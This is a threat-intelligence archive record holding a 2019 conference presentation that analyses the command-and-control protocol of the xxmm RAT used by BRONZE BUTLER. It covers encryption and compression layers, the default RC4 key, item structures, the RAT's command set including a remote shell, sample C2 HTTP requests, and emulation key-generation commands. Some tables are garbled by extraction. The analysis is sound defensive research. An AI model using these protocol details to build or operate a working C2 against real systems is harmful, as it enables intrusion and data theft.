{
    "id": "043c0c3b-8a0c-470d-acbc-67be1c3b4274",
    "created_at": "2022-10-25T16:48:12.247698Z",
    "updated_at": "2025-03-27T02:16:01.123639Z",
    "deleted_at": null,
    "sha1_hash": "fc5a3719289a4e0829d97cab642f25c3615b345e",
    "title": "Undestanding Command and Control - An Anatomy of xxmm Communication -",
    "authors": "",
    "file_creation_date": "2019-01-11T15:22:07Z",
    "file_modification_date": "2019-01-16T11:38:51Z",
    "file_size": 1595371,
    "plain_text": "# Understanding Command and Control\n\n###### - An Anatomy of xxmm Communication \n You Nakatsuru Counter Threat Unit\n\n 18/01/19 Japan Security Analyst Conference 2019\n\n\n-----\n\n###### For analyst / researcher / developer\n\n • Provide information about modern C2 implementation including:\n • Encryption, compression, proprietary data structures\n • Provide a training material for C2 analysis\n • You can compare answers with your analysis result\n\n For incident responder\n\n • Tell you the importance of proxy log analysis and server investigation by public sector such as NPA, JPCERT/CC\n\n For red teamer\n\n • Provide knowledge of modern C2 implementation can be used to improve your penetration testing\n\n\n-----\n\n###### • Analysis Target: xxmm\n • xxmm Communication Analysis\n • xxmm Payload Analysis\n • Proof of Analysis\n\n\n-----\n\n## Analysis Target: xxmm\n\n\n-----\n\n##### xxmm (a.k.a. Minzen)\n\n###### RAT malware used by BRONZE BUTLER\n\n • Good sample to understand modern command and control protocol\n • Uses HTTP/S with proxy\n • GET or POST request\n • Also supports TCP/UDP/ICMP\n • Uses encryption\n • RSA + onetime RC4 encryption in its communication\n • Uses proprietary data structures\n • Is capable to do various commands\n\n\n-----\n\n### Supported Features\n\n\n###### Sleep\n\n\n###### Drive info\n\n\n###### File listing, upload, download, deletion\n\n\n###### Directory creation\n\n\n###### Process creation\n\n\n###### Remote Shell\n\n\n-----\n\n### Is BRONZE BUTLER Still Active?\n###### Seems to be inactive since early 2018\n\n • Several Datper variants were observed from Nov, 2017\n • e.g. 517b2695bbf7164bfb9cab0a133bb0b1aeb387cbb7f30aa01bf5d6f89cca4214\n • Changed to use modified RC4 init as the following:\n\n\n###### Seems to be inactive since early 2018\n\n\n-----\n\n### File Information\n\n###### • xxmm dropper (can be downloaded from VT Enterprise)\n\n SHA-256 hash 4d208c86c8331b7f1f6dd53f83af9ee4ec700a74792b419f663a3ce105d15d1c\n\n File type PE32 executable (GUI) Intel 80386, for MS Windows\n\n PE timestamp Thu May 12 02:44:45 2016 UTC\n\n First seen on VT PE32 executable (GUI) Intel 80386, for MS Windows\n\n • xxmm main module (will be loaded by the dropper)\n\n|SHA-256 hash|4d208c86c8331b7f1f6dd53f83af9ee4ec700a74792b419f663a3ce105d15d1c|\n|---|---|\n|Fil e type|PE32 executable (GUI) Intel 80386, for MS Windows|\n|PE timestamp|Thu May 12 02:44:45 2016 UTC|\n|First seen on VT|PE32 executable (GUI) Intel 80386, for MS Windows|\n\n|SHA-256 hash|714863d7d951e87c9cbde87882f9038db7ad7c8dacd29b2c12eb9ebca075ecb8|\n|---|---|\n|File type|PE32 executable (console) Intel 80386, for MS Windows|\n|PE timestamp|Thu May 12 02:44:51 2016 UTC|\n|Target binary||\n\n\n-----\n\n### References / Tools\n\n###### Useful for analysis\n\n • xxmm2_build.exe\n • https://www.virustotal.com/#/file/76340ef248c286270a07e2aee\n c7b1d6a007e77adde08dc6c1dcaa176aef9e1a8/detection\n • xxmm2_steganography.exe\n • https://www.virustotal.com/#/file/27f3a4c757f6e81a0546e47b9\n 7cbaab5e5e2b82a6ec2694641cd41ec47b90766/detection\n • wincrypto - Python module\n • https://github.com/crappycrypto/wincrypto\n • lznt1 - Python module\n • https://github.com/you0708/lznt1\n\n\n-----\n\n### Unpacking main module\n\n###### xxmm installer contains both 32-bit and 64-bit binaries\n\n\n-----\n\n### Decrypting All Encrypted Resources\n\n###### Python scripting is an easy way to decrypt\n\n\n\n###### [+] could not find rc4key, use default key: 1234\n [+] saved unpacked xxmm as xxmm_dropper_unpacked_0.bin\n [+] saved unpacked xxmm as xxmm_dropper_unpacked_1.bin\n [+] saved unpacked xxmm as xxmm_dropper_unpacked_1_unpacked_0.bin\n [+] saved unpacked module as xxmm_dropper_unpacked_1_unpacked_1.bin\n [+] saved unpacked module as xxmm_dropper_unpacked_1_unpacked_2.bin\n [+] saved unpacked xxmm as xxmm_dropper_unpacked_1_unpacked_3.bin\n [+] saved unpacked xxmm as xxmm_dropper_unpacked_1_unpacked_0_unpacked_0.bin\n [+] saved unpacked xxmm as xxmm_dropper_unpacked_0_unpacked_0.bin\n [+] saved unpacked module as xxmm_dropper_unpacked_0_unpacked_1.bin\n [+] saved unpacked module as xxmm_dropper_unpacked_0_unpacked_2.bin\n [+] saved unpacked xxmm as xxmm_dropper_unpacked_0_unpacked_3.bin\n [+] saved unpacked xxmm as xxmm_dropper_unpacked_0_unpacked_0_unpacked_0.bin\n\n\n\n###### [+] could not find rc4key, use default key: 1234\n\n\n-----\n\n### Process of xxmm Main Module \n\n\n-----\n\n### 1. Loading Hardcoded Configuration\n\n|Process of xxmm main module|Col2|Col3|\n|---|---|---|\n|||Config data is XOR encoded with a key character \"f\"|\n||||\n\n\n-----\n\n### 2. Command List Initialization\n\n###### Process of xxmm main module \n\n\n-----\n\n### 3. Command & Control Thread\n\n###### Process of xxmm main module \n\n|Col1|Col2|Col3|Col4|\n|---|---|---|---|\n|||||\n|||||\n|xxmm is capable to have 7 C2 server entries in its config||||\n\n\n-----\n\n## xxmm Communication Analysis\n\n\n-----\n\n### Communication Protocol\n\n###### xxmm supports various communication types\n\n|Type|Protocol|Description|\n|---|---|---|\n|0|HTTP|C2 communication|\n|1|HTTP|C2 communication|\n|2|HTTP|Download C2 server information|\n|4|TCP|C2 communication using proprietary TCP protocol|\n|5|UDP|C2 communication using proprietary UDP protocol|\n|6|ICMP|C2 communication using ICMP echo|\n\n\n-----\n\n###### xxmm Communication Analysis\n#### Type 2: C2 URL Download\n\n\n-----\n\n### GET Request to An Image File\n###### Usual HTTP GET request to hardcoded URL\n\n|Col1|Col2|URL is specified by its config|\n|---|---|---|\n|GET /test/test.jpg HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1) Host: www.example.com Cache-Control: no-cache|||\n||||\n||||\n\n\n-----\n\n###### Encrypted Payload in The Image File\n\n|ntains C2 command (DownloadExecute/ChangeURL)|Col2|Col3|Col4|\n|---|---|---|---|\n|Markers are specified by its config||||\n|||||\n|||||\n\n|Contains C2 command (DownloadExecute/ChangeURL)|Col2|Col3|\n|---|---|---|\n|Markers are specified by its config|||\n|Start marker xxmm|Encrypted payload|End marker mmxx|\n\n\n###### Markers are specified by its config\n\n\n-----\n\n###### xxmm Communication Analysis\n#### Type 0,1: HTTP C2 Communication\n\n\n-----\n\n### C2 Communication using HTTP\n\n###### xxmm communicates with specified C2 server\n\n\n###### xxmm\n\n\n###### C2 server\n\n\n###### 3. Upload result\n\n\n-----\n\n### Ping/Pong\n\n###### Checking C2 server\n\n • Ping/Pong communication will be performed before every C2 communication\n```\nGET /index.php?id0=39454275&id1=0&id2=f7547c11&id3=0&id6=2400000 HTTP/1.1\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1)\nHost: www.example.com\nCache-Control: no-cache\n\n```\n|Col1|HTTP/1.1 200 OK (snip.) Content-Length: 1 1|\n|---|---|\n|1|1|\n\n\n-----\n\n### 1, 3. Parameters of HTTP Request\n```\nGET /index.php?id0=b78503d0&id1=0&id2=f7547c11&id3=1&id4=AAAACAAA(snip.)gPcv^lQ!!&\nid6=2400000 HTTP/1.1\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1)\nHost: www.example.com\nCache-Control: no-cache\n\n```\n|Col1|Description|Ping|Col4|Command Result|Command Request|Col7|\n|---|---|---|---|---|---|---|\n|Param 0|Random hex string|8 digits hex string||8 digits hex string|8 digits hex string||\n|Param 1|Constant value|0||0|0||\n|Param 2|Client ID|8 digits h|ex string Will be|8 digits hex string POST data if the siz|8 digits h e is large|ex string|\n|Param 3|Request type|0||1|2||\n|Param 4|Encrypted payload|||Base64 like string|||\n|Param 5|Unknown|?||?|?||\n|Param 6|Current interval|2400000||2400000|2400000||\n\n\n-----\n\n### 2. Receive command\n###### HTTP Communication with given C2 server\n\n\n-----\n\n##### Encrypted Payload in GET Request\n\n###### If RSA is enabled\n\n • LZNT1 compression\n • Performed using RtlCompressBuffer\n LZNT1\n\n • Add 1 byte header\n\n • RC4 encryption using randomly generated one-time key\n RSA + RC4\n\n • RC4 one-time key is encrypted with RSA public key\n\n • Base64 encoding with custom table\n • ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstu\n Custom\n```\n             vwxyz0123456789+/= Base64\n             ↓\n             ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstu\n             vwxyz0123456789^`!\n\n```\n\n-----\n\n### One time Key Encryption\n\n###### Using RSA key pair\"s\"\n\n • Encrypted one-time RC4 encryption key with server public key\n • RC4 encrypted + LZNT1 compressed payload\n\n Server Public key\n\n xxmm\n\n\n###### C2 server\n\n|RSA key pair\"s\"|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|RSA key pair\"s\" • Encrypted one-time RC4 encryption key with server public key • RC4 encrypted + LZNT1 compressed payload Server Server Public key Private Key Client Client • Encrypted one-time RC4 encryption key with Private Key Public Key client public key • RC4 encrypted + LZNT1 compressed payload|||||\n|Server Public key Client • Private Key c||d payload Server Private Key Client ith Public Key|||\n||• c|ith|||\n||||||\n\n\n-----\n\n### Decrypting Encrypted Payload\n\n|Header length|RSA flag (0x00000001)|RSA encrypted RC4 key|RC4 encrypted payload|\n|---|---|---|---|\n\n|Compress flag|LZNT1 compressed/plain data|\n|---|---|\n\n\n-----\n\n##### Encrypted Payload in GET Request\n\n###### If RSA is disabled\n\n • LZNT1 compression\n • Performed using RtlCompressBuffer\n LZNT1\n\n • Add 1 byte header\n\n • RC4 encryption using default key\n RC4 • “1234”\n\n • Base64 encoding with custom table\n • ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstu\n Custom\n```\n             vwxyz0123456789+/= Base64\n             ↓\n             ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstu\n             vwxyz0123456789^`!\n\n```\n\n-----\n\n### Decrypting Encrypted Payload\n\n|Header length|RSA flag (0x00000000)|RC4 encrypted payload|\n|---|---|---|\n\n|Compress flag|LZNT1 compressed/plain data|\n|---|---|\n\n\n-----\n\n## xxmm Payload Analysis\n\n\n-----\n\n### Data Format of Payload\n\n###### • Need to extract “item” to understand the meaning of command\n\n|Header length|RSA flag (0x00000001)|Col3|RSA encrypted RC4 key|Col5|RC4 encrypted payload|Col7|Col8|Col9|\n|---|---|---|---|---|---|---|---|---|\n||||||||||\n|Compress flag|LZNT1 compressed/plain data||||||||\n||||||||||\n|Payload header||Items header||Item||Item|Item|Item|\n\n\n-----\n\n### Item Structure\n\n###### xxmm uses item list in their communication and configuration\n\n • Item format: Length ID Data\n • xxmm has various ID - difficult to enum them\n • e.g. decoded config\n\n|Length|ID|Data|\n|---|---|---|\n\n\n-----\n\n### Items Structure\n\n###### Header + Item data\n\n Length Type Items data\n\n • Items format:\n • Type 0/10: data from server, Type 1/11: data from client, Type 2: configuration\n • e.g. decoded config\n\n|Length|Type|Items data|\n|---|---|---|\n\n\n-----\n\n### Analyzing Items/Item Structure\n\n\n-----\n\n### Payload Header\n\n###### Offset Size\n```\nedc80b19 0x00 4\n00000000 0x04 4\n0172d218 0x08 1\n0000007a\n\n 00000001 0x0C Variable\n00000018…\n\n```\n|Offset|Size|Value|Description|\n|---|---|---|---|\n|0x00|4|Timestamp|Return value of GetTickCount|\n|0x04|4|Split count|Num of “items” blocks (starts from 0)|\n|0x08|1|1byte flag|0: Larger than max size 1: Less than max size|\n|0x0C|Variable|Items|Payload|\n\n\n-----\n\n### Command and Control\n\n###### Using item structure\n\n Command request\n\n Item Item Item\n Payload Items\n\n・・・\n###### Time\n header header 0x10001 API name 0x10002 Argument 1\n stamp\n\n xxmm C2 server\n\n|Payload header|Items header|Item|Col4|Item|Col6|Item|・・・|\n|---|---|---|---|---|---|---|---|\n|||0x10001|API name|0x10002|Time stamp|Argument 1||\n\n|Payload header|Items header|Item|Col4|Item|Col6|Item|Col8|・・・|\n|---|---|---|---|---|---|---|---|---|\n|||0x10001|API name|0x10002|Time stamp|0x20004|Status code||\n\n\n###### Copied from command items\n\n\n-----\n\n### RAT Command: xxmm API\n\n###### • GetSystemInformation\n • DownloadExecute\n • ChangeUrl\n • ChangeTimeInterval\n • Uninstall\n • PlugIn\n • PowershellEncodedCommand\n • CreateProcessLow\n\n\n-----\n\n### RAT Command: Standard(?) API\n\n\n\n###### • stdapi_execute_sleep\n • stdapi_execute_commandgroup\n • stdapi_syncshell_kill\n • stdapi_syncshell_control\n • stdapi_syncshell_open\n • stdapi_cmd_kill\n • stdapi_cmd_control\n • stdapi_cmd_open\n • stdapi_fs_search\n • stdapi_fs_file_upload\n • stdapi_fs_file_download\n • stdapi_fs_file_excute\n • stdapi_fs_GetLogicalDriver\n\n\n\n###### • stdapi_fs_sha1\n • stdapi_fs_md5\n • stdapi_fs_file_move\n • stdapi_fs_file_expand_path\n • stdapi_fs_stat\n • stdapi_fs_separator\n • stdapi_fs_delete_file\n • stdapi_fs_delete_dir\n • stdapi_fs_mkdir\n • stdapi_fs_chdir\n • stdapi_fs_getwd\n • stdapi_fs_ls\n\n\n-----\n\n### Based on Metasploit API?\n\n|Col1|ame with Metasploit API|\n|---|---|\n|Same n||\n|||\n\n\n###### Same name with Metasploit API\n\n\n-----\n\n### Command Details\n\n|Command|Argument 1|Argument 2|Argument 3|Result 1|Result 2|Result 3|\n|---|---|---|---|---|---|---|\n|GetSystemInformation|-|-|-|0x4001A|-|-|\n||-|-|-|System info|-|-|\n|DownloadExecute|0x404D5|0x104D3|0x204D4|-|-|-|\n||File data|File path|Show flag|-|-|-|\n|ChangeUrl|0x104F6|0x20529|-|-|-|-|\n||C2 URL|Server No.|-|-|-|-|\n|ChangeTimeInterval|0x204F7|-|-|-|-|-|\n||New interval|-|-|-|-|-|\n|Uninstall|0x20535|-|-|-|-|-|\n||Run key flag|-|-|-|-|-|\n|PlugIn|0x404D5|-|-|-|-|-|\n||file data|-|-|-|-|-|\n|PowershellEncodedCommand|0x104F8|-|-|-|-|-|\n||Encoded PS command|-|-|-|-|-|\n|CreateProcessLow|0x1052D|0x2052E|-|-|-|-|\n||Command line|Alt process|-|-|-|-|\n\n\n-----\n\n### Command Details\n\n|Command|Argument 1|Argument 2|Argument 3|Result 1|Result 2|Result 3|\n|---|---|---|---|---|---|---|\n|stdapi_fs_ls|0x104B0|-|-|0x104B1|0x104B2|0x800004C4|\n||Target dir|-|-|File name|Full path|File stat|\n|stdapi_fs_getwd|-|-|-|0x104B0|-|-|\n||-|-|-|Current dir|-|-|\n|stdapi_fs_chdir|0x104B0|-|-|-|-|-|\n||Target dir|-|-|-|-|-|\n|stdapi_fs_mkdir|0x104B0|-|-|-|-|-|\n||Target dir|-|-|-|-|-|\n|stdapi_fs_delete_dir|0x104B0|-|-|-|-|-|\n||Target dir|-|-|-|-|-|\n|stdapi_fs_delete_file|0x104B2|-|-|-|-|-|\n||Target file|-|-|-|-|-|\n|stdapi_fs_separator|-|-|-|0x1000A|-|-|\n||-|-|-|Path separator|-|-|\n|stdapi_fs_stat|0x104B2|-|-|0x800004C4|-|-|\n||Target file|-|-|File stat|-|-|\n\n\n-----\n\n### Command Details\n\n|Command|Argument 1|Argument 2|Argument 3|Result 1|Result 2|Result 3|\n|---|---|---|---|---|---|---|\n|stdapi_fs_file_expand_path|0x104B2|-|-|0x104B2|-|-|\n||Target path|-|-|Full path|-|-|\n|stdapi_fs_md5|0x104B2|-|-|0x104B1|-|-|\n||Target path|-|-|MD5 digest|-|-|\n|stdapi_fs_sha1|0x104B2|-|-|0x104B1|-|-|\n||Target path|-|-|SHA-1 digest|-|-|\n|stdapi_fs_GetLogicalDriver|-|-|-|0x104B2|0x204D2|-|\n||-|-|-|Drive root|Drive type|-|\n|stdapi_fs_file_execute|0x104D3|0x204D4|-|-|-|-|\n||Command line|Show flag|-|-|-|-|\n|stdapi_fs_file_download|0x104B2|0x104B2|-|0x104B2|0x104B2|0x404D5|\n||Target path|Unknown|-|File path|Unknown|File data|\n|stdapi_fs_file_upload|0x104B2|0x104B2|0x404D5|0x104B2|0x104B2|-|\n||Target path|Unknown|File data|File path|Unknown|-|\n|stdapi_fs_search|0x104D0|0x104CF|0x804CE|0x104B2|0x104B1|0x204B4|\n||Target path|Target filename|Recursive flag|Dir|Filename|File size|\n\n\n-----\n\n### Command Details\n\n|Command|Argument 1|Argument 2|Argument 3|Result 1|Result 2|Result 3|\n|---|---|---|---|---|---|---|\n|stdapi_cmd_open|0x104D3|0x2050A|-|0x2050A|-|-|\n||Alt shell|Terminate flag|-|PID|-|-|\n|stdapi_cmd_control|0x404D6|-|-|0x404D6|-|-|\n||Shell command|-|-|Output|-|-|\n|stdapi_cmd_kill|-|-|-|-|-|-|\n||-|-|-|-|-|-|\n|stdapi_syncshell_open|0x104D3|-|-|-|-|-|\n||Alt shell|-|-|-|-|-|\n|stdapi_syncshell_control|0x404D6|-|-|0x404d7|-|-|\n||Shell command|-|-|Output|-|-|\n|stdapi_syncshell_kill|-|-|-|-|-|-|\n||-|-|-|-|-|-|\n|stdapi_execute_commandgroup|0x404D8|-|-|-|-|-|\n||Command group|-|-|-|-|-|\n|stdapi_execute_sleep|0x204D9|-|-|-|-|-|\n||Sleep time|-|-|-|-|-|\n\n\n-----\n\n### Analyzing Arguments\n###### Check getting item function\n\n|• e.g.|ChangeUrl command|\n|---|---|\n||e several function call arse arguments mmand function|\n|There ar to p in co||\n|||\n\n\n###### There are several function call to parse arguments in command function\n\n\n-----\n\n### e.g. File Uploading\n\n###### Request to upload C:¥hoge.txt\n\n Command request\n\n Item Item Item Item\n Payload Items\n```\n                          0x10001 0x10002 0x104B2 0x104B2\n header header\n 'stdapi_fs_file_download' Timestamp u'C:¥hoge.txt' ''\n              AAAAiAAAAAFg`y7o2T7BvTFDZDWFuR0Uuu7rlk0uUUytKzrp6Mxy`^AfuAHr1a(snip.)RHJp6p8\n              qQ5LppSwF4HoD4SRS3i8D5zMmHIxo9N1jtk89i992GlvEfWr1t57gl0LTZQXVihmeedUNbI!\n\n xxmm C2 server\n\n Item Item Item Item Item Item\n\n Payload Items 0x10001 0x10002 0x20004 ﻿0x104B2 0x104B2 0x404D5\n header header\n 'stdapi_fs_file Time Status code u'C:¥hoge.txt' '' File data _download' stamp\n      GET /index.php?id0=d65d4f8a&id1=0&id2=f7547c11&id3=1&id4=AAAAiAAA(snip.)Izxj4ER6A^Dg!!&id6=10000\n\n```\n|Payload header|Items header|Item|Item|Item|Item|\n|---|---|---|---|---|---|\n|||0x10001|0x10002|0x104B2|0x104B2|\n|||'stdapi_fs_file_download'|Timestamp|u'C:¥hoge.txt'|''|\n\n|Payload header|Items header|Item|Item|Item|Item|Item|Item|\n|---|---|---|---|---|---|---|---|\n|||0x10001|0x10002|0x20004|﻿0x104B2|0x104B2|0x404D5|\n|||'stdapi_fs_file _download'|Time stamp|Status code|u'C:¥hoge.txt'|''|File data|\n\n\n-----\n\n### e.g. Remote Shell\n\n###### To execute 'ipconfig'\n\n Command request\n\n Payload Items Item Item\n header header 0x10001 'stdapi_cmd_open' 0x10002 Timestamp\n```\n             AAAAiAAAAAEmb`Wsg0WNLPFrSlzQT9Dd7lHE(snip.)sUsgDpsHqMRYh97zmm0lPnMW^utiDGkFFbNIpgva4QHcNx\n\n Payload Items Item Item Item\n header header 0x10001 'stdapi_cmd_open' 0x10002 Timestamp 0x20004 Status code\n          GET /index.php?id0=55243eab&id1=0&id2=f7547c11&id3=1&id4=AAAAiAAAAAGiI(snip.)uBRuYfmCLbo!&id6=10000\n\n Command request\n xxmm C2 server\n\n Payload Items Item Item Item\n header header 0x10001 'stdapi_cmd_control' 0x10002 Timestamp 0x404D6 'ipconfig'\n             AAAAiAAAAAFWzEmlvPSj8KASo0uPFhrzCEM5(snip.)haf6XHV8jpRQcXyU71sI`6Ul2MbbVvBpXGdaQuXZ3BlHl7\n\n Payload Items Item Item Item Item\n header header 0x10001 'stdapi_cmd_control' 0x10002 Timestamp 0x20004 Status code 0x404D6 output\n          POST /index php?id0=44be644f&id1=0&id2=f7547c11&id3=1&id6=10000, id4=AAAAiAAAAAF(snip.)HiNsLOaIMa3\n\n```\n|Payload header|Items header|Item|Col4|Item|Col6|\n|---|---|---|---|---|---|\n|||0x10001|'stdapi_cmd_open'|0x10002|Timestamp|\n\n|Payload header|Items header|Item|Col4|Item|Col6|Item|Col8|\n|---|---|---|---|---|---|---|---|\n|||0x10001|'stdapi_cmd_open'|0x10002|Timestamp|0x20004|Status code|\n\n|Payload header|Items header|Item|Col4|Item|Col6|Item|Col8|\n|---|---|---|---|---|---|---|---|\n|||0x10001|'stdapi_cmd_control'|0x10002|Timestamp|0x404D6|'ipconfig'|\n\n|Payload header|Items header|Item|Col4|Item|Col6|Item|Col8|Item|Col10|\n|---|---|---|---|---|---|---|---|---|---|\n|||0x10001|'stdapi_cmd_control'|0x10002|Timestamp|0x20004|Status code|0x404D6|output|\n\n\n-----\n\n## Proof of Analysis\n\n\n-----\n\n### C2 Emulation Environment\n\n\n-----\n\n### Base Provider Key BLOBs\n\n###### RSA key format can be imported by CryptImportKey API\n\n • See https://docs.microsoft.com/en-us/windows/desktop/seccrypto/base-provider-key-blobs\n\n • We can create the key pair using PowerShell commands\n```\n Add-Type -AssemblyName System.Security\n $RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider\n Set-Content \"rsa_server_public_key.bin\" -Value $RSA.ExportCspBlob($False) -Encoding Byte\n Set-Content \"rsa_server_private_key.bin\" -Value $RSA.ExportCspBlob($True) -Encoding Byte\n $RSA2 = New-Object System.Security.Cryptography.RSACryptoServiceProvider\n Set-Content \"rsa_client_public_key.bin\" -Value $RSA2.ExportCspBlob($False) -Encoding Byte\n Set-Content \"rsa_client_private_key.bin\" -Value $RSA2.ExportCspBlob($True) -Encoding Byte\n\n```\n|Add-Type -AssemblyName System.Security $RSA = New-Object System.Security.Cryptography.RSACryptoServiceProv|Col2|Col3|\n|---|---|---|\n||Add-Type -AssemblyName System.Security $RSA = New-Object System.Security.Cryptography.RSACryptoServiceProv||\n\n```\n  Add-Type -AssemblyName System.Security\n  $RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider\n\n```\n\n-----\n\n### Captured Packet\n\n###### \"dir\" command execution\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://jsac.jpcert.or.jp/archive/2019/pdf/JSAC2019_8_nakatsuru_en.pdf"
    ],
    "report_names": [
        "JSAC2019_8_nakatsuru_en.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1547220127,
    "ts_modification_date": 1547638731,
    "files": {
        "pdf": "https://archive.orkl.eu/fc5a3719289a4e0829d97cab642f25c3615b345e.pdf",
        "text": "https://archive.orkl.eu/fc5a3719289a4e0829d97cab642f25c3615b345e.txt",
        "img": "https://archive.orkl.eu/fc5a3719289a4e0829d97cab642f25c3615b345e.jpg"
    }
}